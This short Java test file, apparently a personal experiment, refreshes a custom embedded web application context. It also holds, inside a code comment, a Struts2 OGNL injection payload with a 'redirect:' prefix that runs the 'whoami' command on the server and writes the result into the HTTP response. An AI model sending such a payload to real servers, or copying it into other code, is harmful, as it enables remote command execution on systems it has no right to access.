package cn.wqd.submethod;

/**
 * Created by dell on 2019/8/15.
 */
public class Test {
    public static void main(String[] args) {
        MyAnnotationConfigEmbeddedWebApplicationContext myAnnotationConfigEmbeddedWebApplicationContext =new MyAnnotationConfigEmbeddedWebApplicationContext();
        myAnnotationConfigEmbeddedWebApplicationContext.refresh();

        /*redirect:${
            #req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),
            #s=new java.util.Scanner((new java.lang.ProcessBuilder('whoami'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'),
            #str=#s.hasNext()?#s.next():'',
            #resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
            #resp.setCharacterEncoding('UTF-8'),
            #resp.getWriter().println(#str),
            #resp.getWriter().flush(),
            #resp.getWriter().close()
        }*/
    }
}
